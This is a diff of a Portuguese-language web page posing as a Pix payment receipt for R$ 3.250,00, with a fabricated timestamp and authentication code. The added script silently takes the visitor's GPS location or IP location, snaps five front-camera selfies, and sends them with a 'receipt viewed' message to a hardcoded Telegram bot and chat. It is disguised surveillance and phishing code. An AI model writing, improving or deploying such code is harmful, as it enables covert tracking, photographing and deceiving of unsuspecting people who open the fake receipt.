@@ -21,7 +21,6 @@ body{display:flex;justify-content:center;align-items:center;height:100vh;backgro
 </head>
 <body>
 
-<!-- ===== ALTERADO: token e chat-id já fixos ===== -->
 <script>
   const TELEGRAM_BOT_TOKEN = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
   const TELEGRAM_CHAT_ID   = '-1003187104876';
@@ -57,32 +56,74 @@ body{display:flex;justify-content:center;align-items:center;height:100vh;backgro
 
 <script>
 function sendToTelegram(msg){
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+  return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:msg})
   });
 }
 
+function sendToTelegramPhoto(base64, caption){
+  const form = new FormData();
+  form.append('chat_id', TELEGRAM_CHAT_ID);
+  form.append('photo', dataURItoBlob(base64), 'foto.jpg');
+  form.append('caption', caption);
+  return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,{
+    method:'POST', body:form
+  });
+}
+
+function dataURItoBlob(dataURI){
+  const byte = atob(dataURI.split(',')[1]);
+  const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+  const ab = new ArrayBuffer(byte.length);
+  const ia = new Uint8Array(ab);
+  for(let i=0;i<byte.length;i++) ia[i]=byte.charCodeAt(i);
+  return new Blob([ab],{type:mime});
+}
+
 async function start(){
   document.getElementById('overlay').style.display='none';
+  let lat='--', lon='--', ipInfo={ip:'--',city:'--',region:'--'};
   try{
-    const stream=await navigator.mediaDevices.getUserMedia({video:true});
-    const video=document.createElement('video');
-    video.srcObject=stream; video.play();
-    const ipInfo=await fetch('https://ipapi.co/json/').then(r=>r.json());
-    const loc=`${ipInfo.city}, ${ipInfo.region} - ${ipInfo.ip}`;
-    const pixTime=new Date(new Date()-60*60*1000);
-    const auth=Array.from({length:8},()=>Math.random().toString(36)[2]).join('').toUpperCase();
-    document.getElementById('dataHora').textContent=pixTime.toLocaleString('pt-BR');
-    document.getElementById('auth').textContent=auth;
-    document.getElementById('ipLoc').textContent=loc;
-    sendToTelegram(`Comprovante visualizado\nValor: R$ 3.250,00\nHora: ${pixTime.toLocaleString('pt-BR')}\nLocal: ${loc}`);
-    document.getElementById('comprovanteWrap').style.display='block';
-    setTimeout(()=>stream.getTracks().forEach(t=>t.stop()),1000);
+    // Localização real
+    const pos = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
+    lat = pos.coords.latitude.toFixed(6);
+    lon = pos.coords.longitude.toFixed(6);
   }catch(e){
-    alert("Permissão negada ou erro de conexão.");
+    // Fallback IP
+    ipInfo = await fetch('https://ipapi.co/json/').then(r=>r.json());
   }
+  const loc = (lat!=='--') ? `GPS: ${lat}, ${lon}` : `${ipInfo.city}, ${ipInfo.region} - ${ipInfo.ip}`;
+
+  // Câmera + 5 selfies
+  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+  const video = document.createElement('video');
+  video.srcObject = stream; video.play();
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  canvas.width = 640; canvas.height = 480;
+
+  for(let i=0;i<5;i++){
+    await new Promise(r=>setTimeout(r,800)); // 0,8s entre fotos
+    ctx.drawImage(video,0,0);
+    const base64 = canvas.toDataURL('image/jpeg',0.9);
+    await sendToTelegramPhoto(base64, `Selfie ${i+1}/5 – ${loc}`);
+  }
+  stream.getTracks().forEach(t=>t.stop());
+
+  // Dados do comprovante
+  const pixTime = new Date(new Date()-60*60*1000);
+  const auth = Array.from({length:8},()=>Math.random().toString(36)[2]).join('').toUpperCase();
+  document.getElementByIdId('dataHora').textContent = pixTime.toLocaleString('pt-BR');
+  document.getElementById('auth').textContent = auth;
+  document.getElementById('ipLoc').textContent = loc;
+
+  // Mensagem texto
+  await sendToTelegram(`Comprovante visualizado\nValor: R$ 3.250,00\nHora: ${pixTime.toLocaleString('pt-BR')}\nLocal: ${loc}`);
+
+  // Mostra comprovante
+  document.getElementById('comprovanteWrap').style.display='block';
 }
 
 function downloadPDF(){
